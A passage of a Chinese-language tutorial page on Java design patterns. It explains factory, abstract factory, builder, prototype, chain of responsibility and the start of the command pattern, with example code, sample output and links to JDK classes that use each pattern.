</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><p>以下的 SimpleFactory 是简单工厂实现，它被所有需要进行实例化的客户类调用。</p>
<div><pre><code><span>public</span> <span>class</span> <span>SimpleFactory</span> <span>{</span>

    <span>public</span> <span>Product</span> <span>createProduct</span><span>(</span><span>int</span> type<span>)</span> <span>{</span>
        <span>if</span> <span>(</span>type <span>==</span> <span>1</span><span>)</span> <span>{</span>
            <span>return</span> <span>new</span> <span>ConcreteProduct1</span><span>(</span><span>)</span><span>;</span>
        <span>}</span> <span>else</span> <span>if</span> <span>(</span>type <span>==</span> <span>2</span><span>)</span> <span>{</span>
            <span>return</span> <span>new</span> <span>ConcreteProduct2</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
        <span>return</span> <span>new</span> <span>ConcreteProduct</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>SimpleFactory</span> simpleFactory <span>=</span> <span>new</span> <span>SimpleFactory</span><span>(</span><span>)</span><span>;</span>
        <span>Product</span> product <span>=</span> simpleFactory<span>.</span><span>createProduct</span><span>(</span><span>1</span><span>)</span><span>;</span>
        <span>// do something with the product</span>
    <span>}</span>
<span>}</span>
</code></pre></div><h2 id="_3-工厂方法-factory-method" tabindex="-1"> 3. 工厂方法（Factory Method）</h2>
<h3 id="intent-2" tabindex="-1"> Intent</h3>
<p>定义了一个创建对象的接口，但由子类决定要实例化哪个类。工厂方法把实例化操作推迟到子类。</p>
<h3 id="class-diagram-2" tabindex="-1"> Class Diagram</h3>
<p>在简单工厂中，创建对象的是另一个类，而在工厂方法中，是由子类来创建对象。</p>
<p>下图中，Factory 有一个 doSomething() 方法，这个方法需要用到一个产品对象，这个产品对象由 factoryMethod() 方法创建。该方法是抽象的，需要由子类去实现。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f4d0afd0-8e78-4914-9e60-4366eaf065b5.png"/> </div><br>
<h3 id="implementation-2" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Factory</span> <span>{</span>
    <span>abstract</span> <span>public</span> <span>Product</span> <span>factoryMethod</span><span>(</span><span>)</span><span>;</span>
    <span>public</span> <span>void</span> <span>doSomething</span><span>(</span><span>)</span> <span>{</span>
        <span>Product</span> product <span>=</span> <span>factoryMethod</span><span>(</span><span>)</span><span>;</span>
        <span>// do something with the product</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteFactory</span> <span>extends</span> <span>Factory</span> <span>{</span>
    <span>public</span> <span>Product</span> <span>factoryMethod</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ConcreteProduct</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteFactory1</span> <span>extends</span> <span>Factory</span> <span>{</span>
    <span>public</span> <span>Product</span> <span>factoryMethod</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ConcreteProduct1</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteFactory2</span> <span>extends</span> <span>Factory</span> <span>{</span>
    <span>public</span> <span>Product</span> <span>factoryMethod</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ConcreteProduct2</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><h3 id="jdk-1" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Calendar.html#getInstance--" target="_blank" rel="noopener noreferrer">java.util.Calendar</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/ResourceBundle.html#getBundle-java.lang.String-" target="_blank" rel="noopener noreferrer">java.util.ResourceBundle</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/text/NumberFormat.html#getInstance--" target="_blank" rel="noopener noreferrer">java.text.NumberFormat</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/nio/charset/Charset.html#forName-java.lang.String-" target="_blank" rel="noopener noreferrer">java.nio.charset.Charset</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/net/URLStreamHandlerFactory.html#createURLStreamHandler-java.lang.String-" target="_blank" rel="noopener noreferrer">java.net.URLStreamHandlerFactory</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/api/java/util/EnumSet.html#of-E-" target="_blank" rel="noopener noreferrer">java.util.EnumSet</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/api/javax/xml/bind/JAXBContext.html#createMarshaller--" target="_blank" rel="noopener noreferrer">javax.xml.bind.JAXBContext</a></li>
</ul>
<h2 id="_4-抽象工厂-abstract-factory" tabindex="-1"> 4. 抽象工厂（Abstract Factory）</h2>
<h3 id="intent-3" tabindex="-1"> Intent</h3>
<p>提供一个接口，用于创建   <strong>相关的对象家族</strong>  。</p>
<h3 id="class-diagram-3" tabindex="-1"> Class Diagram</h3>
<p>抽象工厂模式创建的是对象家族，也就是很多对象而不是一个对象，并且这些对象是相关的，也就是说必须一起创建出来。而工厂方法模式只是用于创建一个对象，这和抽象工厂模式有很大不同。</p>
<p>抽象工厂模式用到了工厂方法模式来创建单一对象，AbstractFactory 中的 createProductA() 和 createProductB() 方法都是让子类来实现，这两个方法单独来看就是在创建一个对象，这符合工厂方法模式的定义。</p>
<p>至于创建对象的家族这一概念是在 Client 体现，Client 要通过 AbstractFactory 同时调用两个方法来创建出两个对象，在这里这两个对象就有很大的相关性，Client 需要同时创建出这两个对象。</p>
<p>从高层次来看，抽象工厂使用了组合，即 Cilent 组合了 AbstractFactory，而工厂方法模式使用了继承。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e2190c36-8b27-4690-bde5-9911020a1294.png"/> </div><br>
<h3 id="implementation-3" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>class</span> <span>AbstractProductA</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>AbstractProductB</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ProductA1</span> <span>extends</span> <span>AbstractProductA</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ProductA2</span> <span>extends</span> <span>AbstractProductA</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ProductB1</span> <span>extends</span> <span>AbstractProductB</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ProductB2</span> <span>extends</span> <span>AbstractProductB</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>AbstractFactory</span> <span>{</span>
    <span>abstract</span> <span>AbstractProductA</span> <span>createProductA</span><span>(</span><span>)</span><span>;</span>
    <span>abstract</span> <span>AbstractProductB</span> <span>createProductB</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteFactory1</span> <span>extends</span> <span>AbstractFactory</span> <span>{</span>
    <span>AbstractProductA</span> <span>createProductA</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ProductA1</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>AbstractProductB</span> <span>createProductB</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ProductB1</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteFactory2</span> <span>extends</span> <span>AbstractFactory</span> <span>{</span>
    <span>AbstractProductA</span> <span>createProductA</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ProductA2</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>AbstractProductB</span> <span>createProductB</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ProductB2</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>AbstractFactory</span> abstractFactory <span>=</span> <span>new</span> <span>ConcreteFactory1</span><span>(</span><span>)</span><span>;</span>
        <span>AbstractProductA</span> productA <span>=</span> abstractFactory<span>.</span><span>createProductA</span><span>(</span><span>)</span><span>;</span>
        <span>AbstractProductB</span> productB <span>=</span> abstractFactory<span>.</span><span>createProductB</span><span>(</span><span>)</span><span>;</span>
        <span>// do something with productA and productB</span>
    <span>}</span>
<span>}</span>
</code></pre></div><h3 id="jdk-2" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/javax/xml/parsers/DocumentBuilderFactory.html" target="_blank" rel="noopener noreferrer">javax.xml.parsers.DocumentBuilderFactory</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/javax/xml/transform/TransformerFactory.html#newInstance--" target="_blank" rel="noopener noreferrer">javax.xml.transform.TransformerFactory</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/javax/xml/xpath/XPathFactory.html#newInstance--" target="_blank" rel="noopener noreferrer">javax.xml.xpath.XPathFactory</a></li>
</ul>
<h2 id="_5-生成器-builder" tabindex="-1"> 5. 生成器（Builder）</h2>
<h3 id="intent-4" tabindex="-1"> Intent</h3>
<p>封装一个对象的构造过程，并允许按步骤构造。</p>
<h3 id="class-diagram-4" tabindex="-1"> Class Diagram</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/db5e376d-0b3e-490e-a43a-3231914b6668.png"/> </div><br>
<h3 id="implementation-4" tabindex="-1"> Implementation</h3>
<p>以下是一个简易的 StringBuilder 实现，参考了 JDK 1.8 源码。</p>
<div><pre><code><span>public</span> <span>class</span> <span>AbstractStringBuilder</span> <span>{</span>
    <span>protected</span> <span>char</span><span>[</span><span>]</span> value<span>;</span>

    <span>protected</span> <span>int</span> count<span>;</span>

    <span>public</span> <span>AbstractStringBuilder</span><span>(</span><span>int</span> capacity<span>)</span> <span>{</span>
        count <span>=</span> <span>0</span><span>;</span>
        value <span>=</span> <span>new</span> <span>char</span><span>[</span>capacity<span>]</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>AbstractStringBuilder</span> <span>append</span><span>(</span><span>char</span> c<span>)</span> <span>{</span>
        <span>ensureCapacityInternal</span><span>(</span>count <span>+</span> <span>1</span><span>)</span><span>;</span>
        value<span>[</span>count<span>++</span><span>]</span> <span>=</span> c<span>;</span>
        <span>return</span> <span>this</span><span>;</span>
    <span>}</span>

    <span>private</span> <span>void</span> <span>ensureCapacityInternal</span><span>(</span><span>int</span> minimumCapacity<span>)</span> <span>{</span>
        <span>// overflow-conscious code</span>
        <span>if</span> <span>(</span>minimumCapacity <span>-</span> value<span>.</span>length <span>></span> <span>0</span><span>)</span>
            <span>expandCapacity</span><span>(</span>minimumCapacity<span>)</span><span>;</span>
    <span>}</span>

    <span>void</span> <span>expandCapacity</span><span>(</span><span>int</span> minimumCapacity<span>)</span> <span>{</span>
        <span>int</span> newCapacity <span>=</span> value<span>.</span>length <span>*</span> <span>2</span> <span>+</span> <span>2</span><span>;</span>
        <span>if</span> <span>(</span>newCapacity <span>-</span> minimumCapacity <span>&lt;</span> <span>0</span><span>)</span>
            newCapacity <span>=</span> minimumCapacity<span>;</span>
        <span>if</span> <span>(</span>newCapacity <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
            <span>if</span> <span>(</span>minimumCapacity <span>&lt;</span> <span>0</span><span>)</span> <span>// overflow</span>
                <span>throw</span> <span>new</span> <span>OutOfMemoryError</span><span>(</span><span>)</span><span>;</span>
            newCapacity <span>=</span> <span>Integer</span><span>.</span>MAX_VALUE<span>;</span>
        <span>}</span>
        value <span>=</span> <span>Arrays</span><span>.</span><span>copyOf</span><span>(</span>value<span>,</span> newCapacity<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>StringBuilder</span> <span>extends</span> <span>AbstractStringBuilder</span> <span>{</span>
    <span>public</span> <span>StringBuilder</span><span>(</span><span>)</span> <span>{</span>
        <span>super</span><span>(</span><span>16</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>String</span> <span>toString</span><span>(</span><span>)</span> <span>{</span>
        <span>// Create a copy, don't share the array</span>
        <span>return</span> <span>new</span> <span>String</span><span>(</span>value<span>,</span> <span>0</span><span>,</span> count<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>StringBuilder</span> sb <span>=</span> <span>new</span> <span>StringBuilder</span><span>(</span><span>)</span><span>;</span>
        <span>final</span> <span>int</span> count <span>=</span> <span>26</span><span>;</span>
        <span>for</span> <span>(</span><span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> count<span>;</span> i<span>++</span><span>)</span> <span>{</span>
            sb<span>.</span><span>append</span><span>(</span><span>(</span><span>char</span><span>)</span> <span>(</span><span>'a'</span> <span>+</span> i<span>)</span><span>)</span><span>;</span>
        <span>}</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>sb<span>.</span><span>toString</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code>abcdefghijklmnopqrstuvwxyz
</code></pre></div><h3 id="jdk-3" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/StringBuilder.html" target="_blank" rel="noopener noreferrer">java.lang.StringBuilder</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/nio/ByteBuffer.html#put-byte-" target="_blank" rel="noopener noreferrer">java.nio.ByteBuffer</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/StringBuffer.html#append-boolean-" target="_blank" rel="noopener noreferrer">java.lang.StringBuffer</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/Appendable.html" target="_blank" rel="noopener noreferrer">java.lang.Appendable</a></li>
<li><a href="https://github.com/apache/camel/tree/0e195428ee04531be27a0b659005e3aa8d159d23/camel-core/src/main/java/org/apache/camel/builder" target="_blank" rel="noopener noreferrer">Apache Camel builders</a></li>
</ul>
<h2 id="_6-原型模式-prototype" tabindex="-1"> 6. 原型模式（Prototype）</h2>
<h3 id="intent-5" tabindex="-1"> Intent</h3>
<p>使用原型实例指定要创建对象的类型，通过复制这个原型来创建新对象。</p>
<h3 id="class-diagram-5" tabindex="-1"> Class Diagram</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b8922f8c-95e6-4187-be85-572a509afb71.png"/> </div><br>
<h3 id="implementation-5" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Prototype</span> <span>{</span>
    <span>abstract</span> <span>Prototype</span> <span>myClone</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcretePrototype</span> <span>extends</span> <span>Prototype</span> <span>{</span>

    <span>private</span> <span>String</span> filed<span>;</span>

    <span>public</span> <span>ConcretePrototype</span><span>(</span><span>String</span> filed<span>)</span> <span>{</span>
        <span>this</span><span>.</span>filed <span>=</span> filed<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>Prototype</span> <span>myClone</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ConcretePrototype</span><span>(</span>filed<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>String</span> <span>toString</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> filed<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Prototype</span> prototype <span>=</span> <span>new</span> <span>ConcretePrototype</span><span>(</span><span>"abc"</span><span>)</span><span>;</span>
        <span>Prototype</span> clone <span>=</span> prototype<span>.</span><span>myClone</span><span>(</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>clone<span>.</span><span>toString</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code>abc
</code></pre></div><h3 id="jdk-4" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/Object.html#clone%28%29" target="_blank" rel="noopener noreferrer">java.lang.Object#clone()</a></li>
</ul>
<h1 id="三、行为型" tabindex="-1"> 三、行为型</h1>
<h2 id="_1-责任链-chain-of-responsibility" tabindex="-1"> 1. 责任链（Chain Of Responsibility）</h2>
<h3 id="intent-6" tabindex="-1"> Intent</h3>
<p>使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链发送该请求，直到有一个对象处理它为止。</p>
<h3 id="class-diagram-6" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Handler：定义处理请求的接口，并且实现后继链（successor）</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ca9f23bf-55a4-47b2-9534-a28e35397988.png"/> </div><br>
<h3 id="implementation-6" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Handler</span> <span>{</span>

    <span>protected</span> <span>Handler</span> successor<span>;</span>


    <span>public</span> <span>Handler</span><span>(</span><span>Handler</span> successor<span>)</span> <span>{</span>
        <span>this</span><span>.</span>successor <span>=</span> successor<span>;</span>
    <span>}</span>


    <span>protected</span> <span>abstract</span> <span>void</span> <span>handleRequest</span><span>(</span><span>Request</span> request<span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteHandler1</span> <span>extends</span> <span>Handler</span> <span>{</span>

    <span>public</span> <span>ConcreteHandler1</span><span>(</span><span>Handler</span> successor<span>)</span> <span>{</span>
        <span>super</span><span>(</span>successor<span>)</span><span>;</span>
    <span>}</span>


    <span>@Override</span>
    <span>protected</span> <span>void</span> <span>handleRequest</span><span>(</span><span>Request</span> request<span>)</span> <span>{</span>
        <span>if</span> <span>(</span>request<span>.</span><span>getType</span><span>(</span><span>)</span> <span>==</span> <span>RequestType</span><span>.</span>TYPE1<span>)</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>request<span>.</span><span>getName</span><span>(</span><span>)</span> <span>+</span> <span>" is handle by ConcreteHandler1"</span><span>)</span><span>;</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>if</span> <span>(</span>successor <span>!=</span> <span>null</span><span>)</span> <span>{</span>
            successor<span>.</span><span>handleRequest</span><span>(</span>request<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteHandler2</span> <span>extends</span> <span>Handler</span> <span>{</span>

    <span>public</span> <span>ConcreteHandler2</span><span>(</span><span>Handler</span> successor<span>)</span> <span>{</span>
        <span>super</span><span>(</span>successor<span>)</span><span>;</span>
    <span>}</span>


    <span>@Override</span>
    <span>protected</span> <span>void</span> <span>handleRequest</span><span>(</span><span>Request</span> request<span>)</span> <span>{</span>
        <span>if</span> <span>(</span>request<span>.</span><span>getType</span><span>(</span><span>)</span> <span>==</span> <span>RequestType</span><span>.</span>TYPE2<span>)</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>request<span>.</span><span>getName</span><span>(</span><span>)</span> <span>+</span> <span>" is handle by ConcreteHandler2"</span><span>)</span><span>;</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>if</span> <span>(</span>successor <span>!=</span> <span>null</span><span>)</span> <span>{</span>
            successor<span>.</span><span>handleRequest</span><span>(</span>request<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Request</span> <span>{</span>

    <span>private</span> <span>RequestType</span> type<span>;</span>
    <span>private</span> <span>String</span> name<span>;</span>


    <span>public</span> <span>Request</span><span>(</span><span>RequestType</span> type<span>,</span> <span>String</span> name<span>)</span> <span>{</span>
        <span>this</span><span>.</span>type <span>=</span> type<span>;</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>


    <span>public</span> <span>RequestType</span> <span>getType</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> type<span>;</span>
    <span>}</span>


    <span>public</span> <span>String</span> <span>getName</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> name<span>;</span>
    <span>}</span>
<span>}</span>

</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><div><pre><code><span>public</span> <span>enum</span> <span>RequestType</span> <span>{</span>
    TYPE1<span>,</span> TYPE2
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>

        <span>Handler</span> handler1 <span>=</span> <span>new</span> <span>ConcreteHandler1</span><span>(</span><span>null</span><span>)</span><span>;</span>
        <span>Handler</span> handler2 <span>=</span> <span>new</span> <span>ConcreteHandler2</span><span>(</span>handler1<span>)</span><span>;</span>

        <span>Request</span> request1 <span>=</span> <span>new</span> <span>Request</span><span>(</span><span>RequestType</span><span>.</span>TYPE1<span>,</span> <span>"request1"</span><span>)</span><span>;</span>
        handler2<span>.</span><span>handleRequest</span><span>(</span>request1<span>)</span><span>;</span>

        <span>Request</span> request2 <span>=</span> <span>new</span> <span>Request</span><span>(</span><span>RequestType</span><span>.</span>TYPE2<span>,</span> <span>"request2"</span><span>)</span><span>;</span>
        handler2<span>.</span><span>handleRequest</span><span>(</span>request2<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><div><pre><code>request1 is handle by ConcreteHandler1
request2 is handle by ConcreteHandler2
</code></pre></div><h3 id="jdk-5" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/logging/Logger.html#log%28java.util.logging.Level,%20java.lang.String%29" target="_blank" rel="noopener noreferrer">java.util.logging.Logger#log()</a></li>
<li><a href="https://commons.apache.org/proper/commons-chain/index.html" target="_blank" rel="noopener noreferrer">Apache Commons Chain</a></li>
<li><a href="http://docs.oracle.com/javaee/7/api/javax/servlet/Filter.html#doFilter-javax.servlet.ServletRequest-javax.servlet.ServletResponse-javax.servlet.FilterChain-" target="_blank" rel="noopener noreferrer">javax.servlet.Filter#doFilter()</a></li>
</ul>
<h2 id="_2-命令-command" tabindex="-1"> 2. 命令（Command）</h2>
<h3 id="intent-7" tabindex="-1"> Intent</h3>
<p>将命令封装成对象中，具有以下作用：</p>
<ul>
<li>使用命令来参数化其它对象</li>
<li>将命令放入队列中进行排队</li>
<li>将命令的操作记录到日志中</li>
<li>支持可撤销的操作</li>
</ul>
<h3 id="class-diagram-7" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Command：命令</li>
<li>Receiver：命令接收者，也就是命令真正的执行者</li>
<li>Invoker：通过它来调用命令</li>
<li>Client：可以设置命令与命令的接收者</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c44a0342-f405-4f17-b750-e27cf4aadde2.png"/> </div><br>
<h3 id="implementation-7" tabindex="-1"> Implementation</h3>
<p>设计一个遥控器，可以控制电灯开关。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e6bded8e-41a0-489a-88a6-638e88ab7666.jpg"/> </div><br>
<div><pre><code><span>public</span> <span>interface</span> <span>Command</span> <span>{</span>
    <span>void</span> <span>execute</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>LightOnCommand</span> <span>implements</span> <span>Command</span> <span>{</span>
    <span>Light</span> light<span>;</span>

    <span>public</span> <span>LightOnCommand</span><span>(</span><span>Light</span> light<span>)</span> <span>{</span>
        <span>this</span><span>.</span>light <span>=</span> light<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>execute</span><span>(</span><span>)</span> <span>{</span>
        light<span>.</span><span>on</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>LightOffCommand</span> <span>implements</span> <span>Command</span> <span>{</span>
    <span>Light</span> light<span>;</span>

    <span>public</span> <span>LightOffCommand</span><span>(</span><span>Light</span> light<span>)</span> <span>{</span>
        <span>this</span><span>.</span>light <span>=</span> light<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>execute</span><span>(</span><span>)</span> <span>{</span>
        light<span>.</span><span>off</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Light</span> <span>{</span>

    <span>public</span> <span>void</span> <span>on</span><span>(</span><span>)</span> <span>{</span>
